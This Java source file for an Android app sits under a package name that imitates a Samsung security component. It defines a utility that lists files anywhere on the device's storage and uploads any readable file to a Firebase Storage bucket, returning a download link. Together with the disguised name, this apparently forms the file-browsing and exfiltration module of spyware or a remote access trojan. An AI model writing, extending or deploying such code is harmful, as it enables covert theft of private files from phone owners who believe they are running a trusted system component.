package com.samsung.android.security.v8.utils;

import android.content.Context;
import android.net.Uri;
import android.os.Environment;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class FilesUtil {
    
    public interface FilesCallback {
        void onFilesListed(Map<String, Object> result);
        void onError(String error);
    }
    
    public interface UploadCallback {
        void onUploadComplete(String url);
        void onError(String error);
    }
    
    public static void listFiles(String path, FilesCallback callback) {
        try {
            File directory;
            
            if ("/".equals(path) || path == null || path.isEmpty()) {
                directory = Environment.getExternalStorageDirectory();
            } else {
                directory = new File(path);
            }
            
            if (!directory.exists() || !directory.isDirectory()) {
                callback.onError("Directory does not exist");
                return;
            }
            
            List<Map<String, Object>> filesList = new ArrayList<>();
            File[] files = directory.listFiles();
            
            if (files != null) {
                for (File file : files) {
                    Map<String, Object> fileInfo = new HashMap<>();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("isDirectory", file.isDirectory());
                    fileInfo.put("size", file.length());
                    fileInfo.put("lastModified", file.lastModified());
                    fileInfo.put("canRead", file.canRead());
                    
                    filesList.add(fileInfo);
                }
            }
            
            Map<String, Object> result = new HashMap<>();
            result.put("files", filesList);
            result.put("currentPath", directory.getAbsolutePath());
            result.put("count", filesList.size());
            result.put("timestamp", System.currentTimeMillis());
            
            callback.onFilesListed(result);
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    public static void uploadFile(Context context, String filePath, UploadCallback callback) {
        try {
            File file = new File(filePath);
            
            if (!file.exists() || !file.canRead()) {
                callback.onError("File does not exist or cannot be read");
                return;
            }
            
            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference();
            StorageReference fileRef = storageRef.child("files/" + file.getName());
            
            Uri fileUri = Uri.fromFile(file);
            
            fileRef.putFile(fileUri)
                    .addOnSuccessListener(taskSnapshot -> {
                        fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
                            callback.onUploadComplete(uri.toString());
                        });
                    })
                    .addOnFailureListener(e -> {
                        callback.onError(e.getMessage());
                    });
                    
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
}
